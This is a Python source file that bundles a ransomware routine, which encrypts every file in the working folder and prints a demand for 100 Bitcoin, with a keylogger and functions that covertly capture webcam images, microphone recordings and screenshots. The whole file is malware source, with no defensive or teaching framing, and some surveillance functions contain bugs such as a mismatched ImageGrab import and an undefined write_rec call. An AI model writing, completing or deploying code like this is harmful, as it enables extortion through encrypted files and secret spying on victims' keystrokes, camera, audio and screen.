import os
import cv2
import time
import pathlib
import logging
from pynput.keyboard import Key, Listener
import logging
import sounddevice
import imagegrab

def encrypt():
    from cryptography.fernet import Fernet

    files = []

    for file in os.listdir():

        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
            continue

        if os.path.isfile(file):
            files.append(file)

    print(files)

    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

    print("All of you file have been encrypted!!! send me 100 Bitcoin or I'll delited yor file")
    
def decrypt():
        
    import os
    from cryptography.fernet import Fernet

    files = []

    for file in os.listdir():

        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
            continue

        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

def keylogger():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    def on_press(key):
        logging.info(str(key))
    
    with Listener(on_press=on_press) as listener :
        listener.join()


def webcam(file_path):
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 10):
        ret, img = cam.read()
        file = (cam_path  + '{}.jpg'.format(x))
        cv2.imwrite(file, img)
        time.sleep(5)

    cam.release                                     # Closes video file or capturing device
    cv2.destroyAllWindows

def microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 10
        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()                          # To check if the recording is finished
        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
        
def screenshot(file_path):
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0,10):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5)                               # Gap between the each screenshot in sec
